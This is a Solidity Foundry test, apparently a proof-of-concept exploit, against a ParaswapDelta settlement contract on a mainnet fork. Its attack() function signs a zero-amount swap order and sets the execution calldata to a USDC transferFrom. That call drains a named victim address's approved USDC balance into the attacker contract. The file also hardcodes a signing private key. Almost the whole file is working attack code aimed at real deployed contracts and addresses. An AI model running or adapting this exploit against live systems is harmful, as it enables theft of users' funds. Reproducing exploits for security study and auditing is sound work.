// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface IParaswapDelta {
    error AllOrdersFailed();
    error InvalidExecutionAddress();

    struct SwapOrder {
        address owner;
        address beneficiary;
        address srcToken;
        address destToken;
        uint256 srcAmount;
        uint256 destAmount;
        uint256 deadline;
        uint256 nonce;
        bytes permit;
    }

    struct SwapOrderWithSig {
        SwapOrder order;
        bytes signature;
    }

    struct SingleOrderData {
        SwapOrderWithSig orderWithSig;
        uint256 feeAmount;
        bytes calldataToExecute;
        address executionAddress;
    }

    struct ParaswapDeltaData {
        // Single order data
        SingleOrderData orderData;
        address feeRecipient;
        uint256 requiredApprovals;
    }

    struct ExecutorData {
        address srcToken;
        address destToken;
        uint256 feeAmount;
        bytes calldataToExecute;
        address executionAddress;
        address feeRecipient;
    }

    function settleSwap(ParaswapDeltaData calldata data) external;
}

contract settleSwapTest is Test {
    IParaswapDelta paradelta = IParaswapDelta(0x1D7405DF25FD2fe80390DA3A696dcFd5120cA9Ce);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address victim = 0x2e5eF37Ade8afb712B8Be858fEc7389Fe32857e2;
    IERC20 realeoTK = IERC20(0xf21661D0D1d76d3ECb8e1B9F1c923DBfffAe4097);
    address puticusv1 = 0x36fF475499E928590659D5b8aA3A34330a583FD9;

    bytes32 constant SWAP_ORDER_TYPEHASH = keccak256(
        "SwapOrder(address owner,address beneficiary,address srcToken,address destToken,uint256 srcAmount,uint256 destAmount,uint256 deadline,uint256 nonce,bytes permit)"
    );

    
    bytes32 constant EIP712_DOMAIN_TYPEHASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );


    uint256 ownerPrivateKey = 0x571c7821b64dadad1e335496cbf9c1c4cf09fbb815c9ac18e3024f3140342bfe; // Replace with your test private key
    address owner = vm.addr(ownerPrivateKey);
    address beneficiary = address(this); 
    address srcToken = address(usdc); 
    address destToken = address(realeoTK); 

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20904334);
        vm.deal(address(usdc), 50 ether);
    }

    
    function getDomainSeparator(uint256 chainId, address verifyingContract) internal pure returns (bytes32) {
        return keccak256(abi.encode(
            EIP712_DOMAIN_TYPEHASH,
            keccak256(bytes("ParaswapDelta")), 
            keccak256(bytes("1")), 
            chainId,
            verifyingContract
        ));
    }

    
    function hashSwapOrder(IParaswapDelta.SwapOrder memory order) internal pure returns (bytes32) {
        return keccak256(abi.encode(
            SWAP_ORDER_TYPEHASH,
            order.owner,
            order.beneficiary,
            order.srcToken,
            order.destToken,
            order.srcAmount,
            order.destAmount,
            order.deadline,
            order.nonce,
            keccak256(order.permit) 
        ));
    }

    
    function toTypedMessageHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(
            "\x19\x01",
            domainSeparator,
            structHash
        ));
    }

    
    function signOrder(
        IParaswapDelta.SwapOrder memory order,
        uint256 ownerPrivateKey,
        uint256 chainId,
        address verifyingContract
    ) public returns (bytes memory) {
        bytes32 domainSeparator = getDomainSeparator(chainId, verifyingContract);
        bytes32 orderHash = hashSwapOrder(order);
        bytes32 digest = toTypedMessageHash(domainSeparator, orderHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function testExploit() external {
        usdc.approve(address(paradelta), usdc.balanceOf(address(this)));
        usdc.approve(address(puticusv1), usdc.balanceOf(address(this)));

        attack();
    }

    function attack() internal {
        IParaswapDelta.SwapOrder memory swapOrder = IParaswapDelta.SwapOrder({
            owner: address(owner),
            beneficiary: address(owner),
            srcToken: address(usdc),
            destToken: address(realeoTK),
            srcAmount: 0,
            destAmount: 0,
            deadline: block.timestamp + 3600,
            nonce: 1,
            permit: ""
        });


        bytes memory signature = signOrder(swapOrder, ownerPrivateKey, block.chainid, address(paradelta));

        IParaswapDelta.SwapOrderWithSig memory swapOrderWithSig = IParaswapDelta.SwapOrderWithSig({
            order: swapOrder,
            signature: signature
        });

        uint256 allowance = usdc.allowance(victim, address(puticusv1));
        uint256 balance = usdc.balanceOf(victim);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;

        bytes memory trfdata = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",  
            victim, 
            address(this),
            amuntToDrain
        );

        IParaswapDelta.SingleOrderData memory singleOrderData = IParaswapDelta.SingleOrderData({
            orderWithSig: swapOrderWithSig,
            feeAmount: 0,
            calldataToExecute: trfdata,
            executionAddress: address(usdc)
        });

        IParaswapDelta.ParaswapDeltaData memory paraswapDeltaData = IParaswapDelta.ParaswapDeltaData({
            orderData: singleOrderData,
            feeRecipient: address(0),
            requiredApprovals: 0
        });

    
    bytes memory rawInputData = abi.encodeWithSignature(
        "settleSwap((address,address,address,address,uint256,uint256,uint256,uint256,bytes),(uint256,bytes,address),(address,uint256))", 
        paraswapDeltaData
    );

    console.logBytes(rawInputData);  

        IParaswapDelta iParaswapDelta = IParaswapDelta(paradelta);
        iParaswapDelta.settleSwap(paraswapDeltaData);
    }
}
